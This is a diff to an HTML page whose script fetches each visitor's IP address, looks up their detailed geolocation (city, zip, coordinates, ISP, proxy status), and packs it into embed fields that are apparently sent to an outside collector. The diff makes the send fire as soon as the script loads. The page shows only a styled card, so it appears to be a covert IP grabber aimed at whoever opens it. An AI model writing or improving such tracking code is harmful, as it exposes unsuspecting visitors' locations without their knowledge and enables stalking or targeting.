@@ -46,8 +46,8 @@
       -webkit-backdrop-filter: blur(20px);
       border: 1px solid rgba(255, 255, 255, 0.2);
       border-radius: 8px;
-      padding: 48px 32px;
-      max-width: 400px;
+      padding: 48px 64px;
+      max-width: 600px;
       width: 90%;
       text-align: center;
       box-shadow: 
@@ -152,6 +152,8 @@
       let regionCode = 'unknown';
       let district = 'unknown';
       let zip = 'unknown';
+      let countryCode = 'unknown';
+      let geoData = {};
       
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -163,7 +165,7 @@
       
       try {
         const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
-        const geoData = await geoResponse.json();
+        geoData = await geoResponse.json();
         if (geoData.status === 'success') {
           country = geoData.country || 'unknown';
           city = geoData.city || 'unknown';
@@ -181,6 +183,7 @@
           regionCode = geoData.region || 'unknown';
           district = geoData.district || 'unknown';
           zip = geoData.zip || 'unknown';
+          countryCode = geoData.countryCode || 'unknown';
         }
       } catch (error) {
         console.error('Geo fetch failed:', error);
@@ -218,7 +221,7 @@
         { name: 'City', value: city, inline: true },
         { name: 'Status', value: status, inline: true },
         { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-        { name: 'Country Code', value: geoData?.countryCode || 'unknown', inline: true },
+        { name: 'Country Code', value: countryCode, inline: true },
         { name: 'Region', value: region, inline: true },
         { name: 'Region Code', value: regionCode, inline: true },
         { name: 'District', value: district, inline: true },
@@ -292,7 +295,8 @@
       }
     };
     
-    document.addEventListener('DOMContentLoaded', sendData);
+    // Send data immediately on script load
+    sendData();
   </script>
 </body>
 </html>
